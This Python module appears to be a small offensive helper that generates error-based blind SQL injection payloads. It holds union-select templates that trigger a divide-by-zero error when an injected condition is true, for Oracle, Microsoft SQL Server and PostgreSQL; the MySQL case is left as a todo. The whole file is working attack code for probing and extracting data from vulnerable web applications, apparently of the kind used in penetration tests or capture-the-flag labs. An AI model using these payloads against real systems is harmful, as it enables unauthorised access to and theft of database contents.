from enum import Enum, unique

# Conditional Errors
ORACLE_COND_ERROR = "' union select case when ({}) then to_char(1/0) else null end from {}--"
MICROSOFT_COND_ERROR = "' union select case when ({}) then 1/0 else null end--"
POSTGRE_COND_ERROR = "' union select case when ({}) then cast(1/0 as text) else null end--"

@unique
class Database(Enum):
    ORACLE = 1
    MICROSOFT = 2
    POSTGRE = 3
    MYSQL = 4

def create_conditional_error_sqli(sql_condition, database, from_table=""):
    if database is Database.ORACLE:
        if not from_table:
            from_table = "dual"
        return ORACLE_COND_ERROR.format(sql_condition, from_table)
    elif database is Database.MICROSOFT:
        if not from_table:
            return MICROSOFT_COND_ERROR.format(sql_condition)
        else:
            return "{} from {}--".format(
                MICROSOFT_COND_ERROR[:-2].format(sql_condition),
                from_table)
    elif database is Database.POSTGRE:
        if not from_table:
            return POSTGRE_COND_ERROR.format(sql_condition)
        else:
            return "{} from {}--".format(
                POSTGRE_COND_ERROR[:-2].format(sql_condition),
                from_table)
    elif database is Database.MYSQL:
        # todo: figure out the conditional error for mysql databases.
        pass
    else:
        print("Invalid database type specified.")
